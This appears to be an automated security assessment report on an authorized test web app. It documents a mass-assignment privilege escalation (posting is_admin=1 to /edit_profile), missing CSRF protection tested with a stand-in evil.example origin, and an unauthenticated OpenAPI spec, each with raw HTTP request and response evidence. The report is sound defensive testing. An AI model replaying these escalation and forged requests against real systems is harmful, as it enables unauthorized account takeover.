# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — mass-assignment Mass-assignment privilege escalation via is_admin on POST /edit_profile/{id}](#finding-1)
    - [2. LOW — csrf Missing CSRF protection on POST /edit_profile/{id} (no token, no Origin/Referer check)](#finding-2)
    - [3. LOW — info-disclosure Full OpenAPI specification and Swagger UI exposed without authentication](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxo50r1-u2feja` |
| Target | http://target.local:32799/ |
| Started | 2026-06-28T10:51:19.950Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 10 mapped · 10 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32799`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 2 low

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [mass-assignment] Mass-assignment privilege escalation via is_admin on POST /edit_profile/{id}

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32799/

The edit-profile form renders the `is_admin` (Admin Status) select as **disabled** (`<select id="is_admin" name="is_admin" disabled>`), signalling it is not meant to be user-controllable. However, the backend handler POST /edit_profile/{company_id} reads `is_admin` directly from the request body with no authorization check. Submitting `is_admin=1` together with the normal `name` field is accepted: the server responds "Profile updated successfully" and re-renders the profile with `<option value="1" selected>Admin</option>` (and the select no longer disabled), confirming the authenticated company has been escalated to admin. Any regular authenticated user can promote their own account to admin by adding the `is_admin` parameter to the profile-update request. Baseline request (is_admin=0) does not produce the admin marker; the manipulated request (is_admin=1) does, reproducibly.

**Reproduction**

```
1. Authenticate as a normal company (id=1).
2. Observe GET /edit_profile/1 renders the is_admin select as `disabled` (regular user cannot set it via UI).
3. POST /edit_profile/1 with body `name=verdict-probe&is_admin=1` (content-type application/x-www-form-urlencoded).
4. Response is 200 "Profile updated successfully" and the is_admin select now shows `<option value="1" selected>Admin</option>` — the account is now admin.
Negative control: same POST with `is_admin=0` re-renders Regular selected (no admin marker).
```

**Evidence**

- Evidence `ev-mqxoxlhp-1t` — `artifacts/s-0003/ev-mqxoxlhp-1t/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1521
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 11:13:32 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqxoxlpl-1u` — `artifacts/s-0003/ev-mqxoxlpl-1u/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=1
```

Response:

```http
HTTP/1.1 200
content-length: 1511
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 11:13:32 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin" >
            <option value="0" >Regular</option>
            <option value="1" selected>Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqxoxlxc-1v` — `artifacts/s-0003/ev-mqxoxlxc-1v/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=verdict-probe&is_admin=1
```

Response:

```http
HTTP/1.1 200
content-length: 1511
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 11:13:33 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin" >
            <option value="0" >Regular</option>
            <option value="1" selected>Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [LOW] [csrf] Missing CSRF protection on POST /edit_profile/{id} (no token, no Origin/Referer check)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32799/

The state-changing endpoint POST /edit_profile/{company_id} is authenticated purely by a session cookie (blanking the Authorization header still authenticates; blanking the cookie yields 401), and the update form contains no anti-CSRF token. A cross-site request carrying only the session cookie, an attacker-controlled Origin (http://evil.example) and Referer, and no CSRF token is accepted: the server returns 200 "Profile updated successfully" and applies the change. The application performs neither CSRF-token validation nor Origin/Referer validation, so it relies entirely on the cookie's SameSite attribute for protection. CAVEAT: the auth cookie is operator-supplied/injected into the HTTP session, so no fresh Set-Cookie was observable and analyze_session could not read its flags — the SameSite attribute could not be confirmed. If the cookie is SameSite=None (or unset on a context that allows cross-site send), this is fully exploitable to forge profile changes (including, via the separately-reported mass-assignment, flipping a victim's is_admin); if it is SameSite=Lax/Strict, browser cross-site POST exploitation is blocked. Severity set to low pending SameSite confirmation. Note: probe_csrf returned 422 here (it did not send a form content-type); the manual replays below send the correct application/x-www-form-urlencoded body and are the accurate test.

**Reproduction**

```
1. As an authenticated company (id=1), capture the session cookie.
2. From a cross-site context, POST http://target.local:32799/edit_profile/1 with headers Origin: http://evil.example, Referer: http://evil.example/csrf.html, Content-Type: application/x-www-form-urlencoded, the session cookie, and NO Authorization/CSRF token; body `name=verdict-probe&is_admin=0`.
3. Server returns 200 "Profile updated successfully" — the cross-site, token-less request is honored (reproduced twice).
Negative control: identical request with the cookie removed returns 401 "Not authenticated".
To fully confirm browser exploitability, verify in source/Set-Cookie that the auth cookie is not SameSite=Lax/Strict.
```

**Evidence**

- Evidence `ev-mqxp0i8o-24` — `artifacts/s-0003/ev-mqxp0i8o-24/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>
origin: http://evil.example
referer: http://evil.example/csrf.html

name=verdict-probe&is_admin=0
```

Response:

```http
HTTP/1.1 401
content-length: 30
content-type: application/json
date: Sun, 28 Jun 2026 11:15:47 GMT
server: uvicorn
www-authenticate: Bearer

{"detail":"Not authenticated"}
```

- Evidence `ev-mqxp0fim-22` — `artifacts/s-0003/ev-mqxp0fim-22/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>
origin: http://evil.example
referer: http://evil.example/csrf.html

name=verdict-probe&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1521
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 11:15:44 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqxp0gyb-23` — `artifacts/s-0003/ev-mqxp0gyb-23/`

Request:

```http
POST /edit_profile/1 HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>
origin: http://evil.example
referer: http://evil.example/csrf.html

name=verdict-probe&is_admin=0
```

Response:

```http
HTTP/1.1 200
content-length: 1521
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 11:15:46 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Edit Profile</title>
    <style>
        body {
            display: flex;
        }
        .nav {
            width: 200px;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="nav flex-column nav-pills" aria-orientation="vertical">
        
        <a class="nav-link" href="/company/1/jobs">View Jobs</a>
        <a class="nav-link" href="/edit_profile/1">Edit Profile</a>
        

    </div>
    <div class="content">
        
<h2>Edit Profile</h2>

<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>

<form method="post" action="/edit_profile/1">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="verdict-probe" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin"  disabled >
            <option value="0" selected>Regular</option>
            <option value="1" >Admin</option>
        </select>
    </div>
    <button type="submit" class="btn btn-primary">Update Profile</button>
</form>

    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [info-disclosure] Full OpenAPI specification and Swagger UI exposed without authentication

- Screen: `s-0006`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32799/

The FastAPI interactive docs (/docs, Swagger UI) and the machine-readable API specification (/openapi.json) are served to unauthenticated clients. The unauthenticated response is byte-identical to the authenticated one (HTTP 200, 3894 bytes), so the spec is fully public. It discloses the complete API attack surface: every endpoint (POST /token, GET /, GET /company/{company_id}/jobs, GET /ping, GET /edit_profile/{company_id}), their HTTP methods, path/body parameters, types, and request/response schemas. This includes the sensitive /edit_profile/{company_id} endpoint (which carries a separately-confirmed mass-assignment + CSRF issue). Exposing the spec materially accelerates attacker enumeration of the API. This is the FastAPI default (docs are not auth-gated); it is information disclosure, not a true authentication bypass — the docs endpoints are not protected resources.

**Reproduction**

```
1. Without any session cookie or Authorization header, GET http://target.local:32799/openapi.json → 200 with the complete OpenAPI 3.1 spec (3894 bytes) enumerating all endpoints, params and schemas (positive replays ev-mqxp9qsj-2k, ev-mqxp8coj-2i/ev-mqxpat3f-2m). 2. GET http://target.local:32799/docs (unauth) → 200 Swagger UI shell that loads the spec in-browser. 3. Negative control: GET /openapi-nonexistent-verdict.json (unauth) → 404 {"detail":"Not Found"} (ev-mqxpasbj-2l), confirming the 200 on /openapi.json is content-specific, not a catch-all.
```

**Evidence**

- Evidence `ev-mqxpasbj-2l` — `artifacts/s-0006/ev-mqxpasbj-2l/`

Request:

```http
GET /openapi-nonexistent-verdict.json HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Sun, 28 Jun 2026 11:23:47 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqxp9qsj-2k` — `artifacts/s-0006/ev-mqxp9qsj-2k/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 3894
content-type: application/json
date: Sun, 28 Jun 2026 11:22:58 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/token":{"post":{"summary":"Login For Access Token","operationId":"login_for_access_token_token_post","requestBody":{"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_login_for_access_token_token_post"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/":{"get":{"summary":"Login","operationId":"login__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}},"/company/{company_id}/jobs":{"get":{"summary":"Show Jobs","operationId":"show_jobs_company__company_id__jobs_get","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/edit_profile/{company_id}":{"get":{"summary":"Edit Profile","operationId":"edit_profile_edit_profile__company_id__get","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}},"post":{"summary":"Update Profile","operationId":"update_profile_edit_profile__company_id__post","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"requestBody":{"required":true,"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_update_profile_edit_profile__company_id__post"}}}},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}}},"components":{"schemas":{"Body_login_for_access_token_token_post":{"properties":{"grant_type":{"anyOf":[{"type":"string","pattern":"password"},{"type":"null"}],"title":"Grant Type"},"username":{"type":"string","title":"Username"},"password":{"type":"string","title":"Password"},"scope":{"type":"string","title":"Scope","default":""},"client_id":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Id"},"client_secret":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Secret"}},"type":"object","required":["username","password"],"title":"Body_login_for_access_token_token_post"},"Body_update_profile_edit_profile__company_id__post":{"properties":{"name":{"type":"string","title":"Name"},"is_admin":{"anyOf":[{"type":"boolean"},{"type":"null"}],"title":"Is Admin","default":0}},"type":"object","required":["name"],"title":"Body_update_profile_edit_profile__company_id__post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```

- Evidence `ev-mqxpat3f-2m` — `artifacts/s-0006/ev-mqxpat3f-2m/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:32799
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 3894
content-type: application/json
date: Sun, 28 Jun 2026 11:23:48 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/token":{"post":{"summary":"Login For Access Token","operationId":"login_for_access_token_token_post","requestBody":{"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_login_for_access_token_token_post"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/":{"get":{"summary":"Login","operationId":"login__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}},"/company/{company_id}/jobs":{"get":{"summary":"Show Jobs","operationId":"show_jobs_company__company_id__jobs_get","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/edit_profile/{company_id}":{"get":{"summary":"Edit Profile","operationId":"edit_profile_edit_profile__company_id__get","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}},"post":{"summary":"Update Profile","operationId":"update_profile_edit_profile__company_id__post","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"requestBody":{"required":true,"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_update_profile_edit_profile__company_id__post"}}}},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}}},"components":{"schemas":{"Body_login_for_access_token_token_post":{"properties":{"grant_type":{"anyOf":[{"type":"string","pattern":"password"},{"type":"null"}],"title":"Grant Type"},"username":{"type":"string","title":"Username"},"password":{"type":"string","title":"Password"},"scope":{"type":"string","title":"Scope","default":""},"client_id":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Id"},"client_secret":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Secret"}},"type":"object","required":["username","password"],"title":"Body_login_for_access_token_token_post"},"Body_update_profile_edit_profile__company_id__post":{"properties":{"name":{"type":"string","title":"Name"},"is_admin":{"anyOf":[{"type":"boolean"},{"type":"null"}],"title":"Is Admin","default":0}},"type":"object","required":["name"],"title":"Body_update_profile_edit_profile__company_id__post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```
